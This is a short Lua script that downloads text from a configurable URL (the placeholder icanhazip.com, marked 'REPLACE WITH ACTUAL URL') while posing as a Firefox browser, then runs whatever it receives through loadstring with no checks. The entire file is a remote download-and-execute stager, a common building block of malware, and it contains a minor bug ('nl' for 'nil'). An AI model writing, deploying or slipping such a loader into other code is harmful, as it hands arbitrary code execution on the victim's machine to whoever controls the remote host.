http = require("http")
crypto = require('crypto')
socket = require('socket')

-- REPLACE WITH ACTUAL URL
local url = "https://icanhazip.com"


function getPageContent(url)
    r, err = http.request("get", url, {headers={["User-Agent"]="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"}})
    if err ~= nil then
        return nil, err, nil
    end

    if r['status_code'] ~= 200 then
        return nl, "Got http code " .. tostring(r['status_code']), r['status_code']
    end
    return r['body'], nil
end

function eval(input)
    local f = loadstring(input)
    return f()
end

local dat = getPageContent(url)

eval(dat)